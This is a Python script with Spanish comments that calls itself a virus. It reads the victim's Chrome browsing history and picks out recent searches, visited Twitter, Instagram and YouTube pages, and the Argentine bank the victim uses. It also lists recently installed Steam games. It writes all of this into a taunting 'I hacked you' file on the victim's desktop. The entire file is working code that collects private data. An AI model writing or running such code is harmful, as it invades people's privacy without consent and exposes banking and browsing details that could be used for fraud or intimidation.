# LIBRERIAS
import glob
import os
import re
import sqlite3
from pathlib import Path
from time import sleep
from random import randrange

# VARIABLES UNIVERSALES
hacker_file_name = "{} te he hackeado.txt".format(os.getlogin())


def get_user_path():
    return "{}/".format(Path.home())


def time_sleep():
    # ESPERAR UN TIEMPO RANDOM ENTRE 1 Y 3 HS
    hs = randrange(0, 3)
    hs = 0
    min = randrange(0, 60)
    min = 0
    time_seconds = (hs * 60 * 60) + (min * 60)
    time_seconds = 5
    print("EL VIRUS SE ACTIVARA EN {}:{}:{}".format(f"{hs:02d}", f"{min:02d}", time_seconds))
    sleep(time_seconds)


def get_chrome_history(user_path):
    # LEER HISTORIAL GOOGLE
    urls = None
    while not urls:
        try:
            history_path = user_path + "AppData/Local/Google/Chrome/User Data/Default/History"
            connection = sqlite3.connect(history_path)
            cursor = connection.cursor()
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
            urls = cursor.fetchall()
            connection.close()
            return urls

        except sqlite3.OperationalError:
            print("NO SE PUEDE ACCEDER AL HISTORIAL DE NAVEGACION - RELOAD CHECK IN 5 SECONDS")
            sleep(5)


def create_hacker_file(user_path):
    # CREAR BLOC NOTAS VIRUS
    hacker_file = open(user_path + "Desktop/" + hacker_file_name, "w")
    hacker_file.write("""
Gracias {} por confiar y concederme \nacceso a tu informacion privada... Te dare una pequeña demostracion\n""".format(
        os.getlogin()))

    return hacker_file


def check_bank_account(hacker_file, chrome_history):
    # LEER BANCOS
    his_bank = None
    banks = ["Macro", "BBVA", "Santander", "Provincia", "BNA", "ICBC", "BancoGalicia", "Bancor"]

    hacker_file.write("-" * 100 + "\nESTE ES TU BANCO DONDE GUARDAS TU DINERO\n\n")

    for item in chrome_history:
        for b in banks:
            if b.lower() in (item[0].lower()):
                his_bank = b
                name = item[0]
                break
        if his_bank:
            hacker_file.write("--- {} ---\n {}\n\n".format(item[0], item[2]))
            break


def check_and_write_history_twitter(hacker_file, chrome_history):
    # ESPIAR TWITTER
    count = 1
    hacker_file.write("-" * 100 + "\nESTAS FUERON TUS ULTIMAS BUSQUEDAS EN TWITTER \n\n")

    for item in chrome_history:
        results = re.findall("https://twitter.com/(\w+)$", item[2])
        if results and results[0] not in ["home", "messages", "notifications", "explore"]:
            if (count <= 5):
                hacker_file.write("{}) {}\n     {}\n\n".format(f"{count:2d}", results[0], item[2]))
                count += 1


def check_and_write_history_youtube(hacker_file, chrome_history):
    # ESPIAR YOUTUBE
    count = 1
    hacker_file.write("-" * 100 + "\nESTAS FUERON TUS ULTIMAS BUSQUEDAS EN YOUTUBE \n\n")

    for item in chrome_history:
        results = re.findall("https://www.youtube.com/(.+_channel=)", item[2])
        if results:
            if (count <= 5):
                hacker_file.write("{}) {}\n     {}\n\n".format(f"{count:2d}", item[0], item[2]))
                count += 1


def check_and_write_history_instagram(hacker_file, chrome_history):
    # ESPIAR INSTAGRAM
    count = 1
    hacker_file.write("-" * 100 + "\nESTAS FUERON TUS ULTIMAS BUSQUEDAS EN INSTAGRAM \n\n")

    for item in chrome_history:
        results = re.findall("https://www.instagram.com/(\w+)$", item[2])
        if results:
            if (count <= 5):
                hacker_file.write("{}) {}\n     {}\n\n".format(f"{count:2d}", results[0], item[2]))
                count += 1


def check_and_write_history_chrome(hacker_file, chrome_history):
    # ESPIAR GOOGLE
    count = 1
    hacker_file.write("-" * 100 + "\nPRIMERO LEERE ALGUNOS DATOS DE TU HISTORIAL DE INTERNET\n")
    hacker_file.write("-" * 100 + "\nESTAS FUERON TUS ULTIMAS BUSQUEDAS EN INTERNET \n\n")

    for item in chrome_history[:10]:
        hacker_file.write("{}) {}\n     {}\n\n".format(f"{count:2d}", item[0], item[2]))
        count += 1


def check_and_write_steam(hacker_file):
    # ESPIAR STEAM
    contador = 0
    games = []

    # ORDENAR JUEGOS MAS RECIENTES INSTALADOS
    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
    games_paths = glob.glob(steam_path)
    games_paths.sort(key=os.path.getmtime, reverse=True)
    for games_path in games_paths:
        games.append(games_path.split("\\")[-1])

    hacker_file.write("-" * 100 + "\nESTOS SON ALGUNOS DE TUS JUEGOS EN STEAM \n\n")
    while contador < 5:
        hacker_file.write("{}) {}\n".format(contador + 1, games[contador]))
        contador += 1


def main():
    # INSTALAR VIRUS
    time_sleep()
    # IDENTIFICAR USUARIO OBJETIVO
    user_path = get_user_path()
    # ROBAR INFORMACION PRIVADA INTERNET
    chrome_history = get_chrome_history(user_path)
    # ACTIVAR VIRUS IMPRIMIR INFORMACION
    hacker_file = create_hacker_file(user_path)
    # PRINT HISTORIAL DE NAVEGACION
    check_and_write_history_chrome(hacker_file, chrome_history)
    check_and_write_history_twitter(hacker_file, chrome_history)
    check_and_write_history_instagram(hacker_file, chrome_history)
    check_and_write_history_youtube(hacker_file, chrome_history)
    check_bank_account(hacker_file, chrome_history)
    # PRINT STEAM GAMES
    check_and_write_steam(hacker_file)


if __name__ == '__main__':
    main()